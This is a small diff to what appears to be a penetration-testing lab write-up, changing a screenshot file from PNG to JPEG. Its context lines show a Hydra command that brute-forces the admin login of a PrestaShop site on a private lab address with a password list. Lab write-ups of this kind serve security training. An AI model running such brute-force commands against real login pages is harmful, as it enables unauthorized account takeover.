@@ -284,7 +284,7 @@ Now **passwords.txt** can be used with Hydra:
 hydra -l admin@example.com -P passwords.txt 192.168.56.101 http-post-form "/prestashop/admin7xk29df/index.php:email=^USER^&passwd=^PASS^:Invalid"
 ```
 
-![Hydra Attack](screenshots/hydra_attack.png)
+![Hydra Attack](screenshots/hydra_attack.jpeg)
 
 ---
 
